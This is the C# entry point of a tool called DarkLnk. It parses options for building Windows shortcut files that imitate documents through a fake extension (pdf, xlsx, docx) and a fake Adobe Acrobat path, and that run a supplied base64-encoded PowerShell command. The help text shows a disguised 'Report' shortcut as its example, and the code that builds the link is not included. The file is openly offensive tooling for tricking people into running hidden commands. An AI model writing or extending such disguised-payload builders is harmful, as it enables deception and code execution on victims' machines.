using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DarkLnk
{
    public class Entry
    {
        public static DarkLnk dl = new DarkLnk();

        static void Main(string[] args)
        {
            ParseArgs(args);
            dl.BuildLink();
        }

        public static void ParseArgs(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-ex") { dl.LinkExtension = args[i + 1]; }
                if (args[i] == "-o") { dl.OutputName = args[i + 1]; }
                if (args[i] == "-p") { dl.LinkPath = args[i + 1]; }

                //I choose to only accept base64 to avoid issues with quotes, space, and argument parsing
                if (args[i] == "-cmdb64") { dl.Command = Encoding.UTF8.GetString(Convert.FromBase64String(args[i+1])); }
                if (args[i] == "-h") { ShowHelp(); }
            }

        }

        public static void ShowHelp()
        {
            Console.WriteLine(@"**********************************************");
            Console.WriteLine(@"*   ____             _    _           _      *");
            Console.WriteLine(@"*  |  _ \  __ _ _ __| | _| |    _ __ | | __  *");
            Console.WriteLine(@"*  | | | |/ _` | '__| |/ / |   | '_ \| |/ /  *");
            Console.WriteLine(@"*  | |_| | (_| | |  |   <| |___| | | |   <   *");
            Console.WriteLine(@"*  |____/ \__,_|_|  |_|\_\_____|_| |_|_|\_\  *");
            Console.WriteLine(@"*                                            *");
            Console.WriteLine(@"**********************************************");
            Console.WriteLine();
            Console.WriteLine(@" -ex     | The fake extension you want to emulate. e.g. pdf, xls, docx");
            Console.WriteLine(@" -cmdb64 | The PowerShell command you want to run. See Examples");
            Console.WriteLine(@" -o      | The name of the lnk file created. Defaults to calc");
            Console.WriteLine(@" -p      | Fake path. Defaults to Program Files\Adobe\Acrobat (Optional)");
            Console.WriteLine();
            Console.WriteLine(" Example:");
            Console.WriteLine(" DarkLnk.exe -o Report -ex xlsx -cmdb64 LWNvbW1hbmQgIm1rZGlyICJ0ZXN0IiI=");
            Environment.Exit(0);
        }


    }


}
